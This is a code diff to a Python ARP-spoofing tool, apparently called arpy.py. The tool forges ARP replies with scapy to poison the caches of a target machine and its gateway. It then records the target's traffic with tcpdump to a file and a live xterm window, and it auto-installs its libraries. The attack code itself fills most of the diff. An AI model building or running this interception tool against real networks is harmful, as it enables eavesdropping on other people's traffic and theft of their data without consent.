@@ -1,6 +1,5 @@
+#!/usr/bin/python3
 
-from scapy.all import *
-from getmac import get_mac_address
 import subprocess as sub
 import os, sys, threading, signal
 
@@ -19,9 +18,24 @@ $$ |  $$ |$$ |  $$ |$$ |         $$ |
 
 """
 
+try:
+    from scapy.all import *
+    from getmac import get_mac_address
+
+except:
+    print("%s\n[!] Libraries not installed" % LOGO)
+    os.system("echo y | pip3 install getmac && echo y | pip3 install scapy")
+
+    print("[!] Restarting..")
+    os.execv(sys.executable, ['python3'] + sys.argv)
+
 def help():
     print("%s\narpy.py [iface] [target] [gateway] [outfile]\ne.g python3 arpy.py wlp4s0 192.168.1.100 192.168.1.1 out" % LOGO)
     sys.exit(0)
+
+def sniffing(outfile, targip):
+    xterm_sniff = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-w', outfile), stdout=sub.PIPE)
+    print("[+] Capturing packets on thread %s" % str(threading.get_ident()))
 
 def restore(gateway_ip, gateway_mac, target_ip, target_mac):
     # resetting arp cache of gateway and target machine
@@ -48,7 +62,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
     poison_target.psrc = gateway_ip #  this field contains the supposed IP address of the device that is sending the response
     poison_target.pdst = target_ip  # IPv4 address of the intended receiver
     poison_target.hwdst = target_mac
-
+    # no need to define hwsrc as we are sending it..
     poison_gateway = ARP()
     
     poison_gateway.op = 2
@@ -93,9 +107,12 @@ def main(interf, targip, gatewy, outfile):
     poison_t.start()
     
     # beginning sniffing process
-    try:
-        p = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-A','-w', outfile, '--print'), stdout=sub.PIPE)
-        for row in iter(p.stdout.readline, b''): print(row.rstrip())  # iter() to make an iteration
+    mk_outfile = threading.Thread(target = sniffing, args = (outfile, targip))
+    mk_outfile.start()
+
+    xterm_sniff = sub.Popen(('xterm', '-hold', '-e', 'sudo', 'tcpdump', 'ip', 'host', targip, '-vv', '-A'), stdout=sub.PIPE)
+    try: 
+        for packet in iter(xterm_sniff.stdout.readline, b''): print(packet.rstrip())  # iter() to make an iteration
 
     except KeyboardInterrupt:
         restore(gatewy, gatewy_mac, targip, target_mac)
